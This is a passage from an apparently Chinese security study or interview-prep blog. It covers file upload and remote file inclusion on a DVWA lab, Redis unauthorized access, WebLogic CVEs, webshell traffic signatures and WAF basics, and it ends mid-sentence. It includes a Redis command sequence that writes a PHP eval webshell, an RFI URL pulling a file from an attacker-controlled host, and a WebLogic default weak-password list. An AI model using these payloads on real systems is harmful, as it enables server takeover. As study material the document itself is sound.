，发现找到了我们 刚刚发送的数据包，接下来我们需要修改一下文件格式这一选项， 把它的格式改为  image/jpeg，我们这么做的目的为了是欺骗一下服务器端的验证，让它以为是这是一个图片格式 的文件。我们点击一下 Forward ,  把它放过 然后切换到浏览器，我们发现文件上传成功了。</p><p>我们先把 BP 给关掉，然后再用文件包含的方式对上传上去的文件进行访问，查看文件是否真的上传成功文件上传成功！ 接下来我们使用中国菜刀连接一下我们的木马文件。</p><p>打开我们的中国菜刀，在地址栏中填上我们木马文件上传到的路径， 这里采用文件包含的形式 <a href="http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php">http://www.any.com/index.php?page=dvwa/hackable/uploads/shell.php</a> 密码为 f</p><p>脚本类型改为 PHP，点击添加之后，双击我们的链接进入 成功获取了 shell！！！</p><p><strong>远程文件包含是什么？</strong></p><p>远程文件包含本质上和 LFI (本地文件包含) 是同一个概 念，只是被包含的 “文件源” 不是从本次磁盘上获得，而 是从外部输入流得到。 如果 PHP 的配置选项  allow_url_include 为 ON 的话， 则 include/require 函数可以加载远程文件，这种漏洞被称为  “远程文件包含漏洞 (Remote File Inclusion RFI)”。</p><p>注意：如果是包含远程服务器上的 PHP 文件，那么得到的是被远程服务器解析过的 PHP，所以在写一句话木马的 时候就不要做成 .php 的文件 ，一般做成 .txt 的文件，再让它包含过来。</p><p>我们用 windows server 2003 服务器包含一个 Linux 上 的 phpinfo.php 文件，那么得到的就是 Linux 的 php 配置文件 ，而不是 Windows 上的 php 配置信息。</p><p>我们已知 192.168.173.128 这台服务器中存在着文件包含漏洞，我们想要通过远程包含自己的服务器上的木马文件，首先，我们在自己的服务器  192.168.173.129 上新建一 个文件 2.txt。我们通过远程包含文件包含到 192.168.173.128 这台目标 服务器上，  包含的方式与本地包含的方式类似： <a href="http://192.168.173.128/index.php?page=http://192">http://192.168.173.128/index.php?page=http://192</a>. 168.173.129/2.txt。然后我们访问，若看到页面显示正常，说明文件包含成功。</p><h2 id="二、常见未授权漏洞"><a href="#二、常见未授权漏洞" class="headerlink" title="二、常见未授权漏洞"></a>二、常见未授权漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180206524.png" alt="image-20230731180206524"></p><p><strong>redis</strong>   ：  端口开放到公网，默认可能没有配置用户名，利用未授权访问进去写shell，或者通过ssh的公钥进行反弹</p><h3 id="二、redis"><a href="#二、redis" class="headerlink" title="二、redis"></a>二、redis</h3><p><strong>简述一下Redis 未授权访问漏洞。</strong></p><p><strong>Redis 默认情况下，会绑定在 0.0.0.0:6379</strong>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将  <strong>Redis 服务暴露到公网上</strong>，如果在没有设置<strong>密码认证</strong>（<strong>一般为空</strong>），会导致<strong>任意用户</strong>在<strong>可以访问目标服务器的情况下</strong><strong><strong>未授权访问</strong></strong> Redis 以及<strong>读取  Redis 的数据</strong>。攻击者在未授权访问 Redis 的情况下，可以<strong>利用 Redis 自身的提供</strong>的 <strong>config 命令</strong>像目标主机写  WebShell、写 SSH 公钥、创建计划任务<strong>反弹 Shell</strong> 等。其思路都是一样的，就是先将 Redis 的<strong>本地数据库存放目录设置为 web 目录、</strong>~/.ssh 目录或 /var/spool/cron 目录等，然后将  dbfilename（<strong>本地数据库文件名</strong>）设置为文件名你想要写入的文件名称，最后再执行 <strong>save</strong> 或 <strong>bgsave</strong>  保存，则我们就指定的目录里写入指定的文件了。</p><p>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网。 没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config set dir /var/www/html/ config set dbfilename shell.phpset xxx "&lt;?php eval($_POST[whoami]);?&gt;" save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Redis 未授权访问漏洞如何利用？</strong></p><blockquote><p>服务端的 Redis 连接存在未授权，在攻击机上能用 redis-cli 直接登陆连接，并未登陆验证。 开了服务端存在 Web 服务器，并且知道 Web 目录的路径（如利用 phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限。</p></blockquote><p><strong>未授权的条件，修复方式</strong></p><p>Redis 未授权访问是指某些 Redis 实例的访问控制没有得到正确配置，导致攻击者可以通过不需要认证的方式直接连接该实例并进行操作。这可能会导致敏感数据泄露、系统被攻击等安全问题。</p><p>修复 Redis 未授权访问的方式包括以下几个步骤：</p><ol><li>确认是否存在未授权访问：通过检查日志和网络流量等信息，确认是否存在未授权访问的情况。</li><li>修改 Redis 配置文件：在 redis.config 配置文件中，找到 bind 参数并将其设置为 Redis 监听的 IP 地址。此外，还需要设置 requirepass 参数，并设置一个强密码来保护 Redis 数据库。</li><li>重新启动 Redis 服务：在修改完 Redis 配置文件后，需要重新启动 Redis 服务，以便使新的配置生效。</li><li>禁用 Redis 远程访问：如果您的 Redis 服务只在本地使用，则应禁用 Redis 的远程访问，以降低攻击面和提高安全性。</li><li>定期更新 Redis 和操作系统补丁：及时更新 Redis 和操作系统的安全补丁，以修复已知漏洞和提高系统安全性。</li></ol><p>总之，在修复 Redis 未授权访问时，我们需要先确认是否存在未授权访问的情况，然后按照上述步骤进行修复。为了保证系统安全，我们还需要经常检查 Redis 配置文件和操作系统状态，及时更新补丁，并定期进行安全审计和漏洞扫描等操作。</p><h3 id="二、MongoDB-未授权访问漏洞"><a href="#二、MongoDB-未授权访问漏洞" class="headerlink" title="二、MongoDB 未授权访问漏洞"></a>二、MongoDB 未授权访问漏洞</h3><p> <a href="https://cloud.tencent.com/product/mongodb?from=10680">MongoDB</a> 服务安装后，默认未开启权限验证。如果服务监听在 0.0.0.0，则可远程无需授权访问<a href="https://cloud.tencent.com/solution/database?from=10680">数据库</a>。</p><p>​    3.0 之前版本的 MongoDB, 默认监听在 0.0.0.0，3.0 及之后版本默认监听在 127.0.0.1。</p><p>​    3.0 之前版本，如未添加用户管理员账号及数据库账号，使用 –auth 参数启动时，在本地通过 127.0.0.1 仍可无需账号密码登陆访问数据库，远程访问则提示需认证；</p><p>​    3.0 及之后版本，使用 –auth 参数启动后，无账号则本地和远程均无任何数据库访问权限。</p><h2 id="三、常见中间件漏洞"><a href="#三、常见中间件漏洞" class="headerlink" title="三、常见中间件漏洞"></a>三、常见中间件漏洞</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175913646.png" alt="image-20230731175913646"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180017470.png" alt="image-20230731180017470"></p><p><strong>中间件基线规范（APACHE）</strong></p><p>Apache 是一款常用的 Web 服务器软件，为了保障其安全可靠地运行，可以制定中间件基线规范。以下是 Apache 中间件基线规范的一些重要措施：</p><ol><li>版本号管理：定期检查并更新 Apache 版本，及时安装最新版本的补丁与安全更新。</li><li>配置文件规范：对 Apache 的配置文件进行规范化和审计，限制网站访问权限、禁止目录浏览等。</li><li>日志管理：启用 Apache 访问日志和错误日志，定期清理日志文件并做好备份、归档等工作。</li><li>安全加固：如禁用不必要的模块、关闭 TRACE 请求响应、限制 HTTP 方法等。</li><li>SSL/TLS 加强：设置 TLS 选项、开启 HSTS、使用证书身份验证等。</li><li>防火墙和反向代理策略：通过防火墙等技术来过滤恶意流量，使用反向代理策略限制直接连接到 Web 服务器的 IP 地址。</li><li>应用安全：对 Web 应用程序进行安全审计，确保程序的漏洞被修复、未受到攻击等。</li></ol><p>需要注意的是，以上这些措施只是 Apache 中间件基线规范的一部分，实际操作中还需要根据具体情况进行评估和调整。同时，要保障 Apache 服务器的安全性和可靠性，还需要定期备份数据、优化性能等工作。</p><hr><p><strong>中间件常见漏洞</strong></p><p>中间件是指应用程序和操作系统之间的软件组件，常见的中间件漏洞有以下几种：</p><ol><li>Web服务器漏洞：针对Web服务器（如Apache、Nginx）的攻击通常包括利用目录遍历、文件包含、SQL注入等技术。</li><li>数据库漏洞：数据库（如MySQL、Oracle、SQL Server）的漏洞通常涉及未授权的访问、SQL注入等方面。</li><li>应用服务器漏洞：应用服务器（如Tomcat、JBoss、WebLogic）的漏洞通常会导致远程执行代码、拒绝服务等问题。</li><li>消息队列漏洞：消息队列（如RabbitMQ、Kafka）的漏洞通常涉及未授权访问、拒绝服务等问题。</li><li>缓存服务器漏洞：缓存服务器（如Redis、Memcached）的漏洞通常包括未授权访问、命令注入等问题。</li><li>中间件配置问题：中间件的错误配置也可能导致安全问题，比如弱密码、不安全的协议配置等。</li></ol><p>需要注意的是，中间件漏洞是日益增多的，因此建议及时更新和修补中间件的安全漏洞。</p><hr><p><strong>常见中间件的配置文件路径知道哪些？</strong></p><p>不同的中间件软件有不同的配置文件路径。以下是几种常见中间件软件的配置文件路径：</p><ol><li>Apache Web 服务器：httpd.conf 文件通常位于 /etc/httpd/ 或者 /usr/local/apache2/conf/ 目录下。</li><li>Nginx Web 服务器：nginx.conf 文件通常位于 /etc/nginx/ 或者 /usr/local/nginx/conf/ 目录下。</li><li>MySQL 数据库：my.cnf 文件通常位于 /etc/mysql/ 或者 /usr/local/mysql/etc/ 目录下。</li><li>PostgreSQL 数据库：postgresql.conf 和 pg_hba.conf 文件通常位于 /var/lib/pgsql/data/ 或者 /etc/postgresql/<version>/main/ 目录下。</version></li><li>Oracle 数据库：initSID.ora 和 listener.ora 文件通常位于 $ORACLE_HOME/dbs/ 目录下。</li><li>Tomcat 应用服务器：server.xml、context.xml 和 web.xml 文件通常位于 /conf/ 目录下。</li><li>JBoss 应用服务器：standalone.xml 和 standalone-full.xml 文件通常位于 /standalone/configuration/ 目录下。</li></ol><p>需要注意的是，这些路径可能会根据不同的操作系统而有所不同，并且也会随着中间件版本的更新而变化。因此，在进行中间件配置时，建议查询官方文档或参考相关文献以获取最新的配置文件路径信息。</p><h3 id="二、weblogic原理"><a href="#二、weblogic原理" class="headerlink" title="二、weblogic原理"></a>二、weblogic原理</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173434963.png" alt="image-20230731173434963"></p><p><strong>WebLogic 权限绕过的姿势？</strong></p><p><code>CVE-2020-14883</code> 是一个 <code>Console</code> 的未授权访问，而 <code>CVE-2020-14883</code> 是在利用未授权访问的前提下，在 <code>Console</code> 进行代码执行，于是远程攻击者可以构造特殊的 <code>HTTP</code> 请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p><p>1、 通过静态资源来绕过权限验证，防止被重定向到登陆界面。</p><p>2、 通过请求 <code>.portal</code> ，控制处理的 <code>Servlet</code> 是渲染 <code>UI</code> 的 <code>MBeanUtilsInitSingleFileServlet</code> 。</p><p>3、 通过编码后的 <code>../</code> ，让最终渲染的模版是 <code>console.portal</code> 。</p><p>综合起来，才造成了最终的未授权访问。</p><p><strong>Weblogic 漏洞扫描工具</strong></p><p>安装工具：</p><ol><li><p>安装依赖 python &gt;= 3.6 <code>pip3 install requests</code></p></li><li><p>下载 weblogicScanner</p><p><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p></li><li><p>进入 weblogicScanner</p></li><li><p>举例：测试本机是否存在漏洞 `python ws.py -t 127.0.0.1</p></li></ol><p><strong>WebLogic 常用弱口令</strong>：</p><pre class="line-numbers language-none"><code class="language-none">weblogic Oracl@123weblogic weblogicguest guestportaladmin portaladminadmin securityjoe passwordmary passwordsystem securitywlcsystem wlcsystemwlcsystem sipisystemsystem password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>weblogic漏洞</strong></p><pre class="line-numbers language-none"><code class="language-none">Weblogic 反序列化漏洞 CVE-2021-2394Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109Weblogic RCE CVE-2020-14882&amp;14883weblogic jndi注入CVE-2020-14841Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645WebLogic CVE-2020-14756 T3IIOP反序列化RCEWeblogic 远程代码执行漏洞 CVE-2020-2883Weblogic CVE-2020-2551 IIOP协议反序列化rceWeblogic反序列化漏洞 CVE-2019-2890Weblogic反序列化远程代码执行漏洞CVE-2019-2725Weblogic反序列化漏洞 CVE-2019-2729Weblogic任意文件读取漏洞（CVE-2019-2615)）Weblogic 文件上传漏洞（CVE-2019-2618）weblogic 反序列化漏洞 CVE-2018-3252Weblogic反序列化远程代码执行漏洞 CVE-2018-3245Weblogic远程代码执行漏洞 CVE-2018-3191Weblogic任意文件上传漏洞（CVE-2018-2894）Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）Weblogic 反序列化漏洞 CVE-2017-3506Weblogic 反序列化漏洞 CVE-2017-3248Weblogic SSRF漏洞 CVE-2014-4210<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、Struts2-漏洞"><a href="#二、Struts2-漏洞" class="headerlink" title="二、Struts2 漏洞"></a>二、Struts2 漏洞</h2><p>Struts2 是 apache 项目下的一个 web 框架，使用 OGNL 作为默认的表达式语言，由于 OGNL  能够创建或更改可执行代码，因此能够为使用它的任何框架引入严重的安全漏洞，多个 Apache Struts 2 版本容易受到 OGNL  安全漏洞的攻击。</p><h2 id="三、thinkphp漏洞原理："><a href="#三、thinkphp漏洞原理：" class="headerlink" title="三、thinkphp漏洞原理："></a>三、thinkphp漏洞原理：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731174450857.png" alt="image-20230731174450857"></p><h2 id="二、常问的端口信息："><a href="#二、常问的端口信息：" class="headerlink" title="二、常问的端口信息："></a>二、常问的端口信息：</h2><p>21：（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。<br>22：（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。</p><p>23：（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。<br>25：（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。</p><p>53：（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。<br>80/443 ：（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。<br>443：HTTPS安全超文本传输协议，心脏滴血</p><p>445 的永恒之蓝</p><p>135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。</p><p>139/445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。</p><p>3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。</p><p>6379：redis端口</p><p>1433：MSSQL<br>3306：MYSQL<br>3389：windows远程桌面服务端口<br>7701：weblogic<br>8080：TCP,HTTP协议代理服务器：Apache-tomcat默认端口号</p><p>以上仅是一些常见的端口及其漏洞，实际上还有很多其他的端口和漏洞。为了减少被攻击的风险，建议定期进行安全扫描，及时修复已知漏洞，并加强网络安全防护。</p><p>拿到webshell不出网情况下怎么办:<br>reg上传去正向连接。探测出网协议，如dns，icmp。</p><h2 id="二、冰蝎3-0流量特征："><a href="#二、冰蝎3-0流量特征：" class="headerlink" title="二、冰蝎3.0流量特征："></a>二、冰蝎3.0流量特征：</h2><ol><li><h3 id="content-type"><a href="#content-type" class="headerlink" title="content-type"></a>content-type</h3></li><li><h3 id="Accept-amp-Cache-Control"><a href="#Accept-amp-Cache-Control" class="headerlink" title="Accept&amp;Cache-Control"></a>Accept&amp;Cache-Control</h3></li><li><h3 id="user-Agent"><a href="#user-Agent" class="headerlink" title="user-Agent"></a>user-Agent</h3></li><li><h3 id="请求中content-length"><a href="#请求中content-length" class="headerlink" title="请求中content-length"></a>请求中content-length</h3></li></ol><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731170930747.png" alt="image-20230731170930747"></p><h2 id="二、冰蝎4-0的流量特征（和3-0对比观看）："><a href="#二、冰蝎4-0的流量特征（和3-0对比观看）：" class="headerlink" title="二、冰蝎4.0的流量特征（和3.0对比观看）："></a>二、冰蝎4.0的流量特征（和3.0对比观看）：</h2><p>v3.0 和 v4.0 的区别很明显在于这里 <code>$_SESSION['k']=$key</code>，v3.0 版本当中会把 key 作为 session 传入；接着判断 <code>extension_loaded</code>，也就是判断服务端是否存在 <code>openssl</code>拓展，如果不存在就用 base64 解码，然后使用 key 进行异或加密，这也是冰蝎 v4.0 版本当中的 <code>xor_base64</code>加密方式；如果服务端能够加载 openssl 拓展，就使用 AES128 解密，这里对应冰蝎 v4.0 版本当中的 <code>aes</code>加密方式。</p><p><strong>第一阶段-密钥协商</strong></p><p>1.攻击者通过 GET 或者 POST 方法，形如 <a href="http://127.0.0.1/shell.php?pass=645%E7%9A%84%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%86%E9%92%A5%EF%BC%9B">http://127.0.0.1/shell.php?pass=645的请求服务器密钥；</a></p><p>2.服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 <code>$_SESSION</code>变量中，并返回密钥给攻击者。</p><p><strong>第二阶段-加密传输</strong></p><p>1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；</p><p>2）服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令；</p><p>3）执行结果通过 AES 加密后返回给攻击者。</p><ul><li>但是我自己在分析的过程中并没有看到这个密钥协商的过程，同时也没有看到 <code>$_SESSION</code>变量当中存储了 md5 的高 16 位，反而 <code>$_SESSION</code>变量存储的是一个 26 位的字符。不知道这里是我的问题还是冰蝎 4.0 版本就是如此。</li></ul><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731172240969.png" alt="image-20230731172240969"></p><h2 id="二、cs的流量特征：50050端口，心跳包"><a href="#二、cs的流量特征：50050端口，心跳包" class="headerlink" title="二、cs的流量特征：50050端口，心跳包"></a>二、cs的流量特征：50050端口，心跳包</h2><h2 id="二、MSF流量特征？"><a href="#二、MSF流量特征？" class="headerlink" title="二、MSF流量特征？"></a>二、MSF流量特征？</h2><p>MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面：</p><ol><li>目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。</li><li>异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。</li><li>频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。</li><li>数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。</li><li>特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等，这些协议在 MSF 流量中通常表现出特定的流量特征。</li></ol><p>总之，在分析 MSF 流量时，需要综合考虑多个方面的特征，并结合具体的攻击模块和服务进行分析。同时，也需要使用适当的工具和技术，例如网络抓包工具、IDS/IPS 等，来对 MSF 流量进行捕获和分析。</p><h2 id="二、菜刀流量特征："><a href="#二、菜刀流量特征：" class="headerlink" title="二、菜刀流量特征："></a>二、菜刀流量特征：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731172616407.png" alt="image-20230731172616407"></p><h2 id="二、蚁剑流量特征"><a href="#二、蚁剑流量特征" class="headerlink" title="二、蚁剑流量特征:"></a>二、蚁剑流量特征:</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173230742.png" alt="image-20230731173230742"></p><h2 id="二、哥斯拉流量特征："><a href="#二、哥斯拉流量特征：" class="headerlink" title="二、哥斯拉流量特征："></a>二、哥斯拉流量特征：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731173320610.png" alt="image-20230731173320610"></p><h2 id="三、wireshark使用规则"><a href="#三、wireshark使用规则" class="headerlink" title="三、wireshark使用规则"></a>三、wireshark使用规则</h2><pre class="line-numbers language-none"><code class="language-none">【过滤ip】：过滤源ip地址:ip.src1.1.1.1;目的ip地址：ip.dst1.1.1.1;【过滤端口】：过滤80端口：tcp.port80，源端口：tcp.srcport80，目的端口：tcp.dstport==80【协议过滤】：直接输入协议名即可，如http协议http【http模式过滤】：过滤get/post包http.request.mothod=="GET/POST"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、fastjson不出网利用："><a href="#三、fastjson不出网利用：" class="headerlink" title="三、fastjson不出网利用："></a>三、fastjson不出网利用：</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175610705.png" alt="image-20230731175610705"></h2><h2 id="三、存在-反序列化-中间件"><a href="#三、存在-反序列化-中间件" class="headerlink" title="三、存在 反序列化 中间件"></a>三、存在 反序列化 中间件</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175803413.png" alt="image-20230731175803413"></p><h2 id="三、nmap常用参数："><a href="#三、nmap常用参数：" class="headerlink" title="三、nmap常用参数："></a>三、nmap常用参数：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180541206.png" alt="image-20230731180541206"></p><h2 id="四、怎么绕过-cdn，寻找真实-ip："><a href="#四、怎么绕过-cdn，寻找真实-ip：" class="headerlink" title="四、怎么绕过 cdn，寻找真实 ip："></a>四、怎么绕过 cdn，寻找真实 ip：</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731180616607.png" alt="image-20230731180616607"></p><p><strong>如何判断网站是否有 CDN？</strong></p><ul><li>传统访问：用户访问域名 –&gt; 解析服务器 IP–&gt; 访问目标主机</li><li>普通 CDN：用户访问域名 –&gt;CDN 节点 –&gt; 真实服务器 IP–&gt; 访问目标主机</li><li>带 WAF 的 CDN：用户访问域名 –&gt;CDN 节点（云 WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机</li></ul><p>很简单，使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了 CDN</p><p>1、通过 ping 命令，查看回显情况 2、windows 系统环境下，使用 nslookup 进行查询，看返回的域名解析的情况 3、超级 ping 工具，比如”all-tool.cn/tools  /ping“「看 ip 结果」</p><h2 id="四、WebShell-的利用"><a href="#四、WebShell-的利用" class="headerlink" title="四、WebShell 的利用"></a>四、WebShell 的利用</h2><p>Webshell 是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除 web  页面、修改主页等。黑客通常利用常见的漏洞，如 SQL 注入、远程文件包含 (RFI)、FTP，甚至使用跨站点脚本攻击 (XSS)  等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p><p>黑客可以用 web 的方式，通过 asp 或 php 木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。</p><p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p><ul><li><p>WebShell 的分类 ①根据文件大小分类：大马和小马 (通常指的是一句话木马，能够使用菜刀这类工具去直接连接它) ②根据脚本名称分类：jsp、asp、aspx、php</p></li><li><p>WebShell 的利用</p><p>寻找页面上传点</p><p>写好一句话木马（上传木马），比如如下的 PHP 一句话木马的代码：</p><p><code>_POST['shell']); ?&gt;</code></p><p>然后寻找上传后的文件位置（绝对路径），可以用蚁剑、中国菜刀等工具连接到主机进行接下来的操作，比如提权。</p></li><li><p>WebShell 有哪些特征？</p><ul><li><p>持久化远程访问</p><p>Webshell 脚本通常会包含后门，黑客上传 Webshell 之后，就可以充分利用 Webshell  的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。此外，在上传完 Webshell  之后，黑客会选择自己修复漏洞，以确保没有其他人会利用该漏洞。通过这种方式，黑客就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p></li></ul></li><li><p>提权</p><p>在服务器没有配置错误的情况下，Webshell 将在 web 服务器的用户权限下运行，而用户权限是有限的。通过 Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得  Root 权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p></li><li><p>隐藏性极强</p><p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p></li><li><p>WebShell 常用的 PHP 函数</p><p>Webshell 几乎适用于所有 Web 编程语言。之所以关注 PHP，是因为它是 web 上使用最广泛的编程语言。下面是 PHP 中一些执行 shell 命令最常用的函数。</p><ul><li><p>system()</p><p>system () 函数将命令作为参数，并输出结果。</p><p>下面的示例是在 Windows 操作系统上运行 dir 命令，然后返回 PHP 文件所在目录的目录列表。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo system('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul><p>exec()</p><p>exec () 功能是将命令作为参数，但不输出结果。</p><p>如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo exce('ls -al');    echo exce('ls -al',$array);    var_dump($array);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>shell_exec()</p><p>shell_exec () 函数类似于 exec ()，但是，其整个输出结果为字符串。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo shell_exce('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>passthru()</p><p>passthru () 执行一个命令并返回原始格式的输出。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    echo passthru('ls -al');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>proc_open()</p><p>proc_open () 可以创建一个处理程序（流程），实现脚本和要运行的程序之间的通信。</p></li><li><p>倒引号</p><p>PHP 会首先执行 shell 命令中倒引号（`）内的内容</p><h3 id="三、一句话木马白名单绕过："><a href="#三、一句话木马白名单绕过：" class="headerlink" title="三、一句话木马白名单绕过："></a>三、一句话木马白名单绕过：</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230731175233624.png" alt="image-20230731175233624"></p></li></ul><h2 id="四、WAF"><a href="#四、WAF" class="headerlink" title="四、WAF"></a>四、WAF</h2><p>WAF 设备：绿盟 / 深信服 / 启明星辰 / 360 / 阿里云 WAF / 安全狗等</p><p>WAF 通过一组通常称为策略的规则运行。这些策略旨在通过过滤掉恶意流量来防止应用程序中的漏洞。WAF 的价值部分来自于实施策略修改的速度和便利性，从而可以更快地响应不同的攻击向量；在 DDoS 攻击期间，可以通过修改 WAF 策略快速实现限速。</p><p>** 三种 WAF ** 实现基于网络的 WAF 通常是基于硬件的。</p><ul><li><p>由于它们是在本地安装的，因此可以最大限度地减少延迟，但基于网络的 WAF 是最昂贵的选择，并且还需要存储和维护物理设备。  </p><p>代表产品有：Imperva、天清 WAG 等。</p></li><li><p>基于主机的 WAF 可以完全集成到应用程序的软件中。</p><p>此解决方案比基于网络的 WAF 更便宜，并且提供更多的可定制性。基于主机的 WAF 的缺点是消耗本地服务器资源、实施复杂性和维护成本，这些组件通常需要占用大量资源和时间。</p><p>代表产品：安全狗，云锁，D 盾等。  </p></li><li><p>基于云的 WAF 是一种云防火墙。</p><p>他们通常提供交钥匙安装，就像更改 DNS 以重定向流量一样简单。基于云的 WAF 还具有最低的前期成本，因为用户每月或每年为安全即服务付费。基于云的 WAF  还可以提供持续更新的解决方案，以抵御最新的威胁，而无需在用户端进行任何额外的工作或成本。基于云的 WAF 的缺点是用户将责任移交给第三方，因此  WAF 的某些功能对用户来说可能是一个黑匣子。  </p><p>代表产品有：阿里云云盾，腾讯云 WAF 等。</p></li></ul><p><strong>WAF 的工作原理？</strong></p><p>WAF 的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录</p><ul><li><p>预处理</p><p>预处理阶段首先在接收到数据请求流量时会先判断是否为 HTTP/HTTPS 请求，之后会查看此 URL 请求是否在白名单之内，如果该 URL 请求在白名单列表里，直接交给后端 Web 服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p></li><li><p>规则检测</p><p>每一种 WAF 